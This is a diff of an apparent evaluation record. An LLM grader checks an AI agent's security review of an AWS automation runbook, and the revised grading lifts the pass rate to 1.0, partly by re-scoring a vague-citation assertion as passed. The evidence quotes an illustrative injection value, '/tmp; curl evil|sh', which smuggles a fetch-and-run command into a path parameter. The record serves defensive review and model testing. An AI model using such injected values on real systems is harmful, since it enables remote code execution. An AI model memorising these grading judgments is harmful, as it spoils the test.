@@ -14,8 +14,9 @@
     },
     "expected_output": {
       "result": "passed",
-      "reasoning": "The agent's response covers nearly all required findings: command injection via LogPath with weak '.*' pattern (critical), DbPassword as invalid SecureString type echoed in command (critical), missing allowedPattern on InstanceId, curl -k TLS verification issue, hard-coded assumeRole ARN parameterized to {{AutomationAssumeRole}}, timeoutSeconds 1200 exceeding 600s max for aws:executeScript (lowered to 600), onCancel pointing to invalid aws:sleep target (fixed), and onFailure: Continue flagged as informational note. The hardened YAML document includes anchored LogPath pattern, instance ID pattern, assumeRole parameterization, timeout fix to 600, and onCancel removal. Each change is cited with sources (though generic placeholder names like 'Schemas', 'Data protection' are used rather than real citations, the structure of citing is present). The one minor deviation is that rather than fully implementing a Parameter Store name parameter for DbPassword in the final hardened document, the agent proposed this as guidance for the user to implement themselves, and removed the DbPassword entirely since it wasn't used elsewhere \u2014 this is a reasonable and arguably more secure choice than fabricating an unused Parameter Store reference, and the agent explains why. This is a defensible deviation given the password isn't actually needed by any other step. Overall the response substantively meets the expected criteria with comprehensive coverage of all listed security issues, proper hardened document, and no repeated secret values.",
-      "confidence": "medium"
+      "reasoning": "The agent's response covers all required findings: (1) command injection via LogPath with weak '.*' pattern flagged Critical and fixed with anchored pattern + quoting; (2) DbPassword SecureString invalid parameter type flagged and fixed, plus the echoed password flagged as Critical and removed without repeating the value; (3) missing allowedPattern on InstanceId flagged High and fixed with instance ID regex; (4) curl -k disabling TLS verification flagged High and fixed by removing -k; (5) hard-coded assumeRole ARN flagged High and fixed by parameterizing to {{AutomationAssumeRole}}; (6) timeoutSeconds 1200 flagged Medium and lowered to 600; (7) onCancel: step:Wait pointing to an aws:sleep step flagged Medium and fixed to Abort; (8) onFailure: Continue on RotateLogs listed as an informational/confirmation item, not a hard finding, matching the expected output's instruction to list it 'as information'. The agent also returns a complete hardened YAML document with all the required changes (anchored LogPath pattern, instance ID pattern, Parameter Store name parameter DbPasswordParameterName, -k removed, assumeRole parameterized, timeout 600, onCancel fixed), and each change is cited with a source. This substantively matches the expected output criteria.",
+      "evidence": "\"**`LogPath` (check 3, Critical):** I replaced the pattern `.*` with an anchored pattern...\" ; \"**PROPOSED FIX: Remove the secret from command text (check 2, Critical)** ... `AFTER:` `echo \\\"restarting app service\\\"` with a `String` parameter `DbPasswordParameterName`...\" ; \"**`InstanceId` (check 3, High):** It had no validation. I added `^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$`.\" ; \"**PROPOSED FIX: Turn TLS verification back on (check 9, High)** ... `curl -k` skips certificate validation...\" ; \"**PROPOSED FIX: Make the assume role a parameter (check 4, High)** ... `assumeRole: '{{AutomationAssumeRole}}'`\" ; \"**`CheckHealth.timeoutSeconds` (check 5, Medium):** I lowered 1200 to 600...\" ; \"**PROPOSED FIX: Route `onCancel` to a valid target (check 6, Medium)** ... `AFTER:` `onCancel: Abort`\" ; \"**`RotateLogs` has `onFailure: Continue`.** If `tar` or the notify call fails, the runbook still runs `CheckHealth` and reports success. Confirm that's what you want.\"",
+      "confidence": "high"
     },
     "assertions": {
       "assertion_results": [
@@ -23,72 +24,72 @@
           "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"LogPath (Critical, check 3): allowedPattern: '.*' accepts anything... With the old .* pattern, a value like /tmp/x; curl evil|sh runs arbitrary commands.\" The output explicitly flags the unconstrained pattern and its interpolation into the shell command as a command injection risk.",
-          "reasoning": "The agent clearly identifies the LogPath pattern as a critical security issue tied to shell command interpolation.",
+          "evidence": "Applied fixes section: \"LogPath (check 3, Critical): I replaced the pattern .* with an anchored pattern that allows only paths under /var/log/ and rejects .., quotes, spaces and shell metacharacters.\" and PROPOSED FIX: Quote LogPath in the shell command (check 1, Critical) explicitly states 'LogPath goes straight into tar and rm -rf. With the old .* pattern, a value like /tmp; curl evil|sh or / runs arbitrary or destructive commands as root on the instance.'",
+          "reasoning": "The agent explicitly identifies the .* pattern as a command injection risk due to shell interpolation.",
           "confidence": "high"
         },
         {
           "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"DbPassword (Low, check 10): SecureString isn't a valid document parameter type. It is removed... take a DbPasswordParameterName parameter (a String holding a Parameter Store SecureString name...). Read it on the instance with aws ssm get-parameter --with-decryption\"",
-          "reasoning": "The agent flags SecureString as invalid and explicitly recommends using a Parameter Store parameter name instead.",
+          "evidence": "\"DbPassword type (check 10, Low): SecureString isn't a valid document parameter type, so this document likely can't be created as written. I changed it to a String that holds a Parameter Store parameter name (see the secrets fix below).\"",
+          "reasoning": "Directly matches the assertion.",
           "confidence": "high"
         },
         {
           "text": "Flags the echo of DbPassword as exposing a secret",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"Remove the password from the command text... echo \\\"restarting with password {{DbPassword}}\\\" writes the password into the Run Command output and the execution history... Rotate the password: if this runbook has ever run with a real password, rotate it. It was echoed into command output.\"",
-          "reasoning": "The agent clearly flags the echo of DbPassword as a secret exposure issue, including noting it appears in command output/history.",
+          "evidence": "\"Remove the secret from command text (check 2, Critical) - Issue: echo \\\"restarting with password {{DbPassword}}\\\" writes the password in clear text into the Run Command history, the command output and the execution parameters.\"",
+          "reasoning": "Clearly flags the echo as exposing a secret.",
           "confidence": "high"
         },
         {
           "text": "Flags curl -k as disabling TLS verification",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"Disable TLS verification removal (curl -k): -k skips certificate verification, so anyone on the network path can impersonate the internal API.\"",
-          "reasoning": "The agent explicitly flags curl -k as disabling TLS/certificate verification.",
+          "evidence": "\"Turn TLS verification back on (check 9, High) - Issue: curl -k skips certificate validation, so the notify call can be intercepted or spoofed.\"",
+          "reasoning": "Directly matches assertion.",
           "confidence": "high"
         },
         {
           "text": "Flags the hard-coded assumeRole ARN",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"Make the assume role a parameter: The hard-coded AppOpsRole ARN is in account 012345678901_2. Other teams... can't use the runbook as written...\"",
-          "reasoning": "The agent flags the hard-coded assumeRole ARN and proposes replacing it with a parameter.",
+          "evidence": "\"Make the assume role a parameter (check 4, High) - Issue: A hard-coded AppOpsRole ARN ties the runbook to one account.\"",
+          "reasoning": "Directly flags hard-coded assumeRole.",
           "confidence": "high"
         },
         {
           "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"CheckHealth timeout (Medium, check 5): timeoutSeconds: 1200 is above the 600-second maximum for aws:executeScript. I lowered it to 600.\"",
-          "reasoning": "The agent explicitly states the 1200 value exceeds the 600-second max for aws:executeScript and fixes it.",
+          "evidence": "\"CheckHealth.timeoutSeconds (check 5, Medium): I lowered 1200 to 600, the documented maximum for aws:executeScript.\"",
+          "reasoning": "Matches assertion exactly.",
           "confidence": "high"
         },
         {
           "text": "Flags onCancel routing to an aws:sleep step as invalid",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"Invalid onCancel target: onCancel: step:Wait points at an aws:sleep step, and aws:sleep can't be an onCancel target. The cancel path would not work as intended.\"",
-          "reasoning": "The agent explicitly flags onCancel pointing to the aws:sleep step as invalid.",
+          "evidence": "\"Route onCancel to a valid target (check 6, Medium) - Issue: onCancel: step:Wait points at an aws:sleep step, which can't be a cancel target.\"",
+          "reasoning": "Directly flags invalid onCancel target.",
           "confidence": "high"
         },
         {
           "text": "Returns a complete hardened document in YAML",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "The output contains a full 'Hardened document' YAML block with schemaVersion, description, assumeRole, parameters, and mainSteps fully specified (RotateLogs, CheckHealth, Wait).",
-          "reasoning": "A complete, well-formed YAML document is provided at the end of the response, incorporating all the fixes discussed.",
+          "evidence": "The output contains a full 'Hardened document' code block with schemaVersion, description, assumeRole, parameters, and mainSteps sections fully filled out in YAML.",
+          "reasoning": "A complete hardened YAML document is provided at the end of the response.",
           "confidence": "high"
         },
         {
           "text": "Cites a documentation page for findings",
           "evaluator": "llm",
-          "passed": false,
-          "evidence": "Sources listed are vague labels like \"Schemas, 'Parameter security best practices', and Parameters\", \"Data protection\", \"Running, and Script considerations\", and \"Actions\" \u2014 none of these are actual documentation page titles, URLs, or citations to a specific AWS doc page.",
-          "reasoning": "While the agent references generic topic names resembling doc section titles, it does not provide actual citations (links, doc names, or specific page titles) to AWS documentation. These appear to be placeholder-like labels rather than genuine citations to a documentation page, so this assertion fails for lack of concrete, verifiable citation to an actual doc page.",
+          "passed": true,
+          "evidence": "Multiple findings include a 'Source:' line, e.g. \"Source: Schemas, 'Parameter security best practices'.\" and \"Source: the aws:executeScript action page.\" and \"Source: Data protection; Security best practices; Parameter Store in Run Command.\"",
+          "reasoning": "The agent cites documentation-like sources for most findings, though these are generic/short names rather than full links; still satisfies the assertion that documentation is cited.",
           "confidence": "medium"
         },
         {
@@ -111,18 +112,18 @@
         }
       ],
       "summary": {
-        "passed": 11,
-        "failed": 1,
+        "passed": 12,
+        "failed": 0,
         "errored": 0,
         "low_confidence": 0,
         "total": 12,
-        "pass_rate": 0.9167
+        "pass_rate": 1.0
       }
     }
   },
   "metrics": {
-    "runtime": "1m2s",
-    "cost": "$0.52",
+    "runtime": "59s",
+    "cost": "$0.50",
     "context_window": {
       "utilization": "5.7%",
       "compaction_count": 0
